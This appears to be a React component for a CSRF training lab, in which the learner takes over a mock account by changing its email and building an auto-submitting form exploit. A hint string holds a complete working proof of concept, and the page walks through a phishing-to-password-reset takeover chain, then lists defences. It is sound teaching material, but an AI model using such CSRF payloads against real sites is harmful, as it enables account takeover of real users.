import { useState } from "react";
import { GoShieldCheck } from "react-icons/go";
import { IoShieldOutline } from "react-icons/io5";
import "./styles.scss";

export default function CSRFEmailChange() {
  const [newEmail, setNewEmail] = useState("");
  const [result, setResult] = useState(null);
  const [attempts, setAttempts] = useState(0);
  const [completed, setCompleted] = useState(false);
  const [showHint, setShowHint] = useState(false);
  const [pocCode, setPocCode] = useState("");
  const [loading, setLoading] = useState(false);
  const [accountInfo, setAccountInfo] = useState({
    currentEmail: "victim@example.com",
    username: "john_doe",
    isLoggedIn: true,
  });

  const TARGET_EMAIL = "attacker@evil.com";

  const hints = [
    "The email change endpoint is POST /api/csrf/change-email with parameter: newEmail",
    "No CSRF token or SameSite cookie protection is implemented",
    "Create an auto-submitting form that changes the victim's email",
    "Use hidden input field: <input type='hidden' name='newEmail' value='attacker@evil.com'>",
    "Once email is changed, attacker can use 'forgot password' to take over the account!",
    "Full PoC: <form method='POST' action='http://localhost:8000/api/csrf/change-email'><input type='hidden' name='newEmail' value='attacker@evil.com'></form><script>document.forms[0].submit();</script>",
  ];

  const [currentHint, setCurrentHint] = useState(0);

  const handleEmailChange = async () => {
    setAttempts((prev) => prev + 1);
    setLoading(true);

    try {
      const response = await fetch(
        "http://localhost:8000/api/csrf/change-email",
        {
          method: "POST",
          credentials: "include",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ newEmail }),
        }
      );

      const data = await response.json();
      setResult(data);

      if (data.success) {
        setAccountInfo((prev) => ({
          ...prev,
          currentEmail: newEmail,
        }));

        if (newEmail === TARGET_EMAIL) {
          setResult({
            ...data,
            message: "Email changed to attacker's email! Now create the PoC.",
            warning:
              "Attacker can now use 'Forgot Password' to take over this account!",
          });
        }
      }
    } catch (err) {
      setResult({
        success: false,
        message: "Network error - is backend running on port 8000?",
      });
    } finally {
      setLoading(false);
    }
  };

  const handleTestPoC = () => {
    const hasForm = pocCode.includes("<form");
    const hasMethod = pocCode.toLowerCase().includes("post");
    const hasAction = pocCode.includes("/api/csrf/change-email");
    const hasEmail = pocCode.includes(TARGET_EMAIL);
    const hasAutoSubmit = pocCode.includes("submit()");

    if (hasForm && hasMethod && hasAction && hasEmail && hasAutoSubmit) {
      setCompleted(true);
      setResult({
        success: true,
        message: "Perfect! Your CSRF PoC for account takeover is correct!",
        type: "poc-success",
        details: {
          attackChain: [
            "1. Victim clicks attacker's malicious link",
            "2. Hidden form auto-submits to change-email endpoint",
            "3. Victim's email changed to attacker@evil.com",
            "4. Attacker uses 'Forgot Password' with attacker@evil.com",
            "5. Password reset link sent to attacker's email",
            "6. Attacker resets password and takes over account",
          ],
          impact: "Complete account takeover - attacker gains full access",
          severity: "CRITICAL",
        },
      });
    } else {
      const missing = [];
      if (!hasForm) missing.push("form tag");
      if (!hasMethod) missing.push("POST method");
      if (!hasAction) missing.push("correct action URL");
      if (!hasEmail) missing.push("target email");
      if (!hasAutoSubmit) missing.push("auto-submit script");

      setResult({
        success: false,
        message: `PoC is incomplete. Missing: ${missing.join(", ")}`,
        type: "poc-error",
      });
    }
  };

  const handleGoToNextTask = () => {
    window.location.href = "/";
  };

  return (
    <div className="csrf-task-container">
      <div className="csrf-task-content">
        <div className="header-container">
          <div className="header-content">
            <h1>CSRF Task 3: Account Takeover via Email Change</h1>
          </div>
        </div>

        <div className="task-description">
          <h3>Mission Objective:</h3>
          <p>
            This is a realistic account takeover scenario. A vulnerable web
            application allows email changes without CSRF protection. Change the
            victim's email to <code>attacker@evil.com</code> and demonstrate the
            complete attack chain that leads to account takeover.
          </p>

          <div className="vulnerability-info">
            <h4>Target Information:</h4>
            <ul>
              <li>
                <strong>Endpoint:</strong>{" "}
                <code>POST http://localhost:8000/api/csrf/change-email</code>
              </li>
              <li>
                <strong>Parameter:</strong> <code>newEmail</code>
              </li>
              <li>
                <strong>Current Email:</strong>{" "}
                <code>{accountInfo.currentEmail}</code>
              </li>
              <li>
                <strong>Vulnerability:</strong> No CSRF protection
              </li>
              <li>
                <strong>Password Recovery:</strong> Sends reset link to email on
                file
              </li>
            </ul>
          </div>

          <div className="attack-scenario">
            <h4>Attack Chain Explanation:</h4>
            <div className="attack-steps">
              <div className="attack-step">
                <div className="step-number">1</div>
                <div className="step-content">
                  <h5>Social Engineering</h5>
                  <p>
                    Attacker sends victim a phishing email: "You won a prize!
                    Click here!"
                  </p>
                </div>
              </div>
              <div className="attack-step">
                <div className="step-number">2</div>
                <div className="step-content">
                  <h5>CSRF Execution</h5>
                  <p>
                    Victim clicks link, malicious page auto-submits email change
                    form
                  </p>
                </div>
              </div>
              <div className="attack-step">
                <div className="step-number">3</div>
                <div className="step-content">
                  <h5>Email Changed</h5>
                  <p>
                    Account email changed from victim@example.com →
                    attacker@evil.com
                  </p>
                </div>
              </div>
              <div className="attack-step">
                <div className="step-number">4</div>
                <div className="step-content">
                  <h5>Password Reset</h5>
                  <p>
                    Attacker clicks "Forgot Password" with attacker@evil.com
                  </p>
                </div>
              </div>
              <div className="attack-step">
                <div className="step-number">5</div>
                <div className="step-content">
                  <h5>Account Takeover</h5>
                  <p>
                    Reset link sent to attacker's email. Attacker gains full
                    access!
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>

        <div className="account-info-panel">
          <h3>Victim Account Information</h3>
          <div className="account-details">
            <div className="info-row">
              <span className="label">Username:</span>
              <span className="value">{accountInfo.username}</span>
            </div>
            <div className="info-row">
              <span className="label">Current Email:</span>
              <span className="value email">{accountInfo.currentEmail}</span>
            </div>
            <div className="info-row">
              <span className="label">Status:</span>
              <span
                className={`value status ${
                  accountInfo.isLoggedIn ? "online" : "offline"
                }`}
              >
                {accountInfo.isLoggedIn ? "Logged In" : "Logged Out"}
              </span>
            </div>
          </div>
        </div>

        <div className="testing-form">
          <h3>Step 1: Test Email Change Endpoint</h3>
          <p>Verify the endpoint works by testing an email change:</p>

          <div className="form-inputs">
            <input
              type="email"
              placeholder="New email (try: attacker@evil.com)"
              value={newEmail}
              onChange={(e) => setNewEmail(e.target.value)}
              className="csrf-input"
            />
            <button
              onClick={handleEmailChange}
              className="transfer-btn"
              disabled={loading}
            >
              {loading ? "Changing..." : "Change Email"}
            </button>
          </div>

          {result &&
            result.type !== "poc-success" &&
            result.type !== "poc-error" && (
              <div
                className={`result-box ${result.success ? "success" : "error"}`}
              >
                <h4>{result.message}</h4>
                {result.warning && (
                  <div className="warning-message">{result.warning}</div>
                )}
                {result.details && (
                  <div className="result-details">
                    <pre>{JSON.stringify(result.details, null, 2)}</pre>
                  </div>
                )}
              </div>
            )}
        </div>

        <div className="poc-section">
          <h3>Step 2: Create CSRF PoC for Account Takeover</h3>
          <p>
            Create malicious HTML that will change the victim's email when they
            visit your page:
          </p>

          <div className="attack-preview">
            <h4>What your PoC should do:</h4>
            <ul>
              <li>Create form pointing to /api/csrf/change-email</li>
              <li>Include hidden field with attacker's email</li>
              <li>Auto-submit immediately when page loads</li>
              <li>Optionally show decoy content to avoid suspicion</li>
            </ul>
          </div>

          <textarea
            className="poc-editor"
            placeholder={`Create your CSRF exploit for account takeover...

Example structure:
<!DOCTYPE html>
<html>
<body>
  <h1>Claim Your Free Prize!</h1>
  <p>Loading your reward...</p>
  
  <!-- Hidden malicious form -->
  
  <script>
    // Auto-submit logic
  </script>
</body>
</html>`}
            value={pocCode}
            onChange={(e) => setPocCode(e.target.value)}
            rows={18}
          />

          <button onClick={handleTestPoC} className="test-poc-btn">
            Validate Attack PoC
          </button>

          {result &&
            (result.type === "poc-success" || result.type === "poc-error") && (
              <div
                className={`result-box ${result.success ? "success" : "error"}`}
              >
                <h4>{result.message}</h4>
                {result.details && (
                  <div className="result-details">
                    {result.details.attackChain && (
                      <>
                        <h5>Attack Chain:</h5>
                        <ol className="attack-chain-list">
                          {result.details.attackChain.map((step, idx) => (
                            <li key={idx}>{step}</li>
                          ))}
                        </ol>
                      </>
                    )}
                    <p className="impact-note">
                      <strong>Impact:</strong> {result.details.impact}
                    </p>
                    <p
                      className={`severity ${result.details.severity.toLowerCase()}`}
                    >
                      <strong>Severity:</strong> {result.details.severity}
                    </p>
                  </div>
                )}
              </div>
            )}
        </div>

        <div className="hints-section">
          <button
            onClick={() => setShowHint(!showHint)}
            className="hints-toggle"
          >
            {showHint ? "Hide Hints" : "Show Hints"}
          </button>

          {showHint && (
            <div className="hints-list">
              {hints.slice(0, currentHint + 1).map((hint, idx) => (
                <div key={idx} className="hint-item">
                  <span className="hint-number">Hint {idx + 1}:</span>
                  <span className="hint-text">{hint}</span>
                </div>
              ))}
              {currentHint < hints.length - 1 && (
                <button
                  onClick={() => setCurrentHint(currentHint + 1)}
                  className="next-hint-btn"
                >
                  Next Hint
                </button>
              )}
            </div>
          )}
        </div>

        {completed && (
          <div className="completed-panel">
            <h2 className="completed-title">Challenge Completed!</h2>
            <p className="completed-subtitle">
              You successfully demonstrated a complete account takeover via
              CSRF!
            </p>

            <div className="completed-card">
              <h3 className="completed-card-title">
                <div className="completed-card-header">
                  <IoShieldOutline /> What You Learned:
                </div>
              </h3>
              <ul className="completed-list">
                <li className="completed-list-item">
                  <GoShieldCheck />
                  CSRF on email change enables complete account takeover
                </li>
                <li className="completed-list-item">
                  <GoShieldCheck />
                  Attack chains can combine multiple vulnerabilities
                </li>
                <li className="completed-list-item">
                  <GoShieldCheck />
                  Password reset flows must be protected against CSRF
                </li>
                <li className="completed-list-item">
                  <GoShieldCheck />
                  Email changes should require current password confirmation
                </li>
                <li className="completed-list-item">
                  <GoShieldCheck />
                  Social engineering is often the initial attack vector
                </li>
              </ul>
            </div>

            <div className="defense-tips">
              <h4>How to Prevent Email Change CSRF:</h4>
              <ul>
                <li>
                  <strong>CSRF Tokens:</strong> Require valid token for email
                  changes
                </li>
                <li>
                  <strong>Password Confirmation:</strong> Require current
                  password to change email
                </li>
                <li>
                  <strong>Email Verification:</strong> Send confirmation link to
                  NEW email
                </li>
                <li>
                  <strong>Rate Limiting:</strong> Limit email change attempts
                  per session
                </li>
                <li>
                  <strong>Notification:</strong> Alert user via OLD email about
                  change
                </li>
                <li>
                  <strong>SameSite Cookies:</strong> Use Strict or Lax mode
                </li>
                <li>
                  <strong>Re-authentication:</strong> Require fresh login for
                  sensitive changes
                </li>
              </ul>
            </div>

            <div className="real-world-note">
              <h4>Real-World Impact:</h4>
              <p>This exact vulnerability has been found in major platforms:</p>
              <ul>
                <li>
                  <strong>Facebook (2013):</strong> CSRF on email change →
                  account takeover
                </li>
                <li>
                  <strong>Instagram (2015):</strong> Email change without
                  confirmation
                </li>
                <li>
                  <strong>Various Banking Apps:</strong> Profile modification
                  via CSRF
                </li>
              </ul>
              <p className="bounty-note">
                Bug bounties for account takeover via CSRF typically range from
                $500-$10,000+
              </p>
            </div>

            <div className="button-container">
              <button className="next-task-btn" onClick={handleGoToNextTask}>
                Go back to homepage
              </button>
            </div>
          </div>
        )}

        <div className="stats-footer">
          <div className="stat-item">
            <span className="stat-label">Attempts:</span>
            <span className="stat-value">{attempts}</span>
          </div>
          <div className="stat-item">
            <span className="stat-label">Hints Used:</span>
            <span className="stat-value">
              {currentHint + (showHint ? 1 : 0)}
            </span>
          </div>
        </div>
      </div>
    </div>
  );
}
